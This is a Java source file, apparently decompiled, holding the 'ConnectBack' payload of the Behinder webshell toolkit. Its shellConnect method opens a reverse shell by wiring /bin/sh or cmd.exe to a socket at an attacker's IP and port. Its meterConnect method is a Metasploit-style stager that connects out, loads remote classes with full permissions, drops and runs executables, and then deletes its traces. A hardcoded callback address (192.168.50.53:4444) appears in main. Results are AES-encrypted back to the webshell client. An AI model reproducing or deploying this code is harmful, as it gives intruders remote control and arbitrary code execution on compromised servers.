package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.objectweb.asm.Opcodes;

public class ConnectBack extends ClassLoader implements Runnable {

    private static final String JAVA_HOME = System.getProperty("java.home");
    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    private static final String PATH_SEP = System.getProperty("path.separator");
    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    private static final boolean IS_DOS = PATH_SEP.equals(";");
    public static String ip;
    public static String port;
    public static String type;
    private Object Request;
    private Object Response;
    private Object Session;
    InputStream dn;
    OutputStream rm;

    public ConnectBack(InputStream dn2, OutputStream rm2) {
        this.dn = dn2;
        this.rm = rm2;
    }

    public ConnectBack() {
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            if (type.equals("shell")) {
                shellConnect();
            } else if (type.equals("meter")) {
                meterConnect();
            }
            result.put("status", "success");
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Exception e) {
            }
        } catch (Exception e2) {
            result.put("status", "fail");
            result.put("msg", e2.getMessage());
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e3) {
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
            throw th;
        }
        return true;
    }

    public void run() {
        BufferedReader hz = null;
        BufferedWriter cns = null;
        try {
            BufferedReader hz2 = new BufferedReader(new InputStreamReader(this.dn));
            try {
                BufferedWriter cns2 = new BufferedWriter(new OutputStreamWriter(this.rm));
                try {
                    char[] buffer = new char[Opcodes.ACC_ANNOTATION];
                    while (true) {
                        int length = hz2.read(buffer, 0, buffer.length);
                        if (length <= 0) {
                            break;
                        }
                        cns2.write(buffer, 0, length);
                        cns2.flush();
                    }
                    cns = cns2;
                    hz = hz2;
                } catch (Exception e) {
                    cns = cns2;
                    hz = hz2;
                }
            } catch (Exception e2) {
                hz = hz2;
            }
        } catch (Exception e3) {
        }
        if (hz != null) {
            try {
                hz.close();
            } catch (Exception e4) {
                return;
            }
        }
        if (cns != null) {
            try {
                cns.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void shellConnect() throws Exception {
        String ShellPath;
        try {
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                ShellPath = new String("/bin/sh");
            } else {
                ShellPath = new String("cmd.exe");
            }
            Socket socket = new Socket(ip, Integer.parseInt(port));
            Process process = Runtime.getRuntime().exec(ShellPath);
            new Thread(new ConnectBack(process.getInputStream(), socket.getOutputStream())).start();
            new Thread(new ConnectBack(socket.getInputStream(), process.getOutputStream())).start();
        } catch (Exception e) {
            throw e;
        }
    }

    public static void main(String[] args) {
        try {
            ConnectBack c = new ConnectBack();
            ip = "192.168.50.53";
            port = "4444";
            c.meterConnect();
        } catch (Exception e) {
        }
    }

    private void meterConnect() throws Exception {
        Socket socket;
        InputStream in;
        OutputStream out;
        Properties props = new Properties();
        String clazzFile = ConnectBack.class.getName().replace('.', '/') + ".class";
        props.put("LHOST", ip);
        props.put("LPORT", port);
        String executableName = props.getProperty("Executable");
        if (executableName != null) {
            File dummyTempFile = File.createTempFile("~spawn", ".tmp");
            dummyTempFile.delete();
            File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
            tempDir.mkdir();
            File executableFile = new File(tempDir, executableName);
            writeEmbeddedFile(ConnectBack.class, executableName, executableFile);
            props.remove("Executable");
            props.put("DroppedExecutable", executableFile.getCanonicalPath());
        }
        int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
        String droppedExecutable = props.getProperty("DroppedExecutable");
        if (spawn > 0) {
            props.setProperty("Spawn", String.valueOf(spawn - 1));
            File dummyTempFile2 = File.createTempFile("~spawn", ".tmp");
            dummyTempFile2.delete();
            File tempDir2 = new File(dummyTempFile2.getAbsolutePath() + ".dir");
            File propFile = new File(tempDir2, "metasploit.dat");
            File classFile = new File(tempDir2, clazzFile);
            classFile.getParentFile().mkdirs();
            writeEmbeddedFile(ConnectBack.class, clazzFile, classFile);
            if (props.getProperty("URL", "").startsWith("https:")) {
                writeEmbeddedFile(ConnectBack.class, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
            }
            if (props.getProperty("AESPassword", null) != null) {
                writeEmbeddedFile(ConnectBack.class, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
            }
            FileOutputStream fos = new FileOutputStream(propFile);
            props.store(fos, "");
            fos.close();
            Process proc = Runtime.getRuntime().exec(new String[]{getJreExecutable("java"), "-classpath", tempDir2.getAbsolutePath(), ConnectBack.class.getName()});
            proc.getInputStream().close();
            proc.getErrorStream().close();
            Thread.sleep(2000);
            File[] files = {classFile, classFile.getParentFile(), propFile, tempDir2};
            int i = 0;
            while (i < files.length) {
                for (int j = 0; j < 10 && !files[i].delete(); j++) {
                    files[i].deleteOnExit();
                    Thread.sleep(100);
                }
                i++;
            }
        } else if (droppedExecutable != null) {
            File droppedFile = new File(droppedExecutable);
            if (!IS_DOS) {
                try {
                    File.class.getMethod("setExecutable", Boolean.TYPE).invoke(droppedFile, Boolean.TRUE);
                } catch (NoSuchMethodException e) {
                    try {
                        Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
                    } catch (Exception e2) {
                    }
                }
            }
            Runtime.getRuntime().exec(new String[]{droppedExecutable});
            if (!IS_DOS) {
                droppedFile.delete();
                droppedFile.getParentFile().delete();
            }
        } else {
            int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
            String lHost = props.getProperty("LHOST", null);
            String url = props.getProperty("URL", null);
            if (lPort <= 0) {
                in = System.in;
                out = System.out;
            } else if (url != null) {
                if (url.startsWith("raw:")) {
                    in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
                } else if (url.startsWith("https:")) {
                    URLConnection uc = new URL(url).openConnection();
                    Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", URLConnection.class).invoke(null, uc);
                    in = uc.getInputStream();
                } else {
                    in = new URL(url).openStream();
                }
                out = new ByteArrayOutputStream();
            } else {
                if (lHost != null) {
                    socket = new Socket(lHost, lPort);
                } else {
                    ServerSocket serverSocket = new ServerSocket(lPort);
                    socket = serverSocket.accept();
                    serverSocket.close();
                }
                in = socket.getInputStream();
                out = socket.getOutputStream();
            }
            String aesPassword = props.getProperty("AESPassword", null);
            if (aesPassword != null) {
                Object[] streams = (Object[]) Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke(null, in, out, aesPassword);
                in = (InputStream) streams[0];
                out = (OutputStream) streams[1];
            }
            StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
            String[] stageParams = new String[stageParamTokenizer.countTokens()];
            for (int i2 = 0; i2 < stageParams.length; i2++) {
                stageParams[i2] = stageParamTokenizer.nextToken();
            }
            new ConnectBack().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
        }
    }

    private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
        InputStream in = clazz.getResourceAsStream("/" + resourceName);
        FileOutputStream fos = new FileOutputStream(targetFile);
        byte[] buf = new byte[Opcodes.ACC_SYNTHETIC];
        while (true) {
            int len = in.read(buf);
            if (len != -1) {
                fos.write(buf, 0, len);
            } else {
                fos.close();
                return;
            }
        }
    }

    private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
        Class clazz;
        try {
            DataInputStream in = new DataInputStream(rawIn);
            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            if (embeddedStageName == null) {
                int length = in.readInt();
                do {
                    byte[] classfile = new byte[length];
                    in.readFully(classfile);
                    clazz = defineClass(null, classfile, 0, length, pd);
                    resolveClass(clazz);
                    length = in.readInt();
                } while (length > 0);
            } else {
                clazz = Class.forName("javapayload.stage." + embeddedStageName);
            }
            Object stage = clazz.newInstance();
            clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
        } catch (Throwable t) {
            t.printStackTrace(new PrintStream(out));
        }
    }

    private static String getJreExecutable(String command) {
        File jExecutable = null;
        if (IS_AIX) {
            jExecutable = findInDir(JAVA_HOME + "/sh", command);
        }
        if (jExecutable == null) {
            jExecutable = findInDir(JAVA_HOME + "/bin", command);
        }
        if (jExecutable != null) {
            return jExecutable.getAbsolutePath();
        }
        return addExtension(command);
    }

    private static String addExtension(String command) {
        return command + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String dirName, String commandName) {
        File dir = normalize(dirName);
        if (!dir.exists()) {
            return null;
        }
        File executable = new File(dir, addExtension(commandName));
        if (!executable.exists()) {
            return null;
        }
        return executable;
    }

    private static File normalize(String path) {
        Stack s = new Stack();
        String[] dissect = dissect(path);
        s.push(dissect[0]);
        StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);
        while (tok.hasMoreTokens()) {
            String thisToken = tok.nextToken();
            if (!".".equals(thisToken)) {
                if (!"src/main".equals(thisToken)) {
                    s.push(thisToken);
                } else if (s.size() < 2) {
                    return new File(path);
                } else {
                    s.pop();
                }
            }
        }
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < s.size(); i++) {
            if (i > 1) {
                sb.append(File.separatorChar);
            }
            sb.append(s.elementAt(i));
        }
        return new File(sb.toString());
    }

    private static String[] dissect(String path) {
        String root;
        String path2;
        char sep = File.separatorChar;
        String path3 = path.replace('/', sep).replace('\\', sep);
        int colon = path3.indexOf(58);
        if (colon > 0 && IS_DOS) {
            int next = colon + 1;
            String root2 = path3.substring(0, next);
            char[] ca = path3.toCharArray();
            root = root2 + sep;
            if (ca[next] == sep) {
                next++;
            }
            StringBuffer sbPath = new StringBuffer();
            for (int i = next; i < ca.length; i++) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }
            path2 = sbPath.toString();
        } else if (path3.length() <= 1 || path3.charAt(1) != sep) {
            root = File.separator;
            path2 = path3.substring(1);
        } else {
            int nextsep = path3.indexOf(sep, path3.indexOf(sep, 2) + 1);
            if (nextsep > 2) {
                root = path3.substring(0, nextsep + 1);
            } else {
                root = path3;
            }
            path2 = path3.substring(root.length());
        }
        return new String[]{root, path2};
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
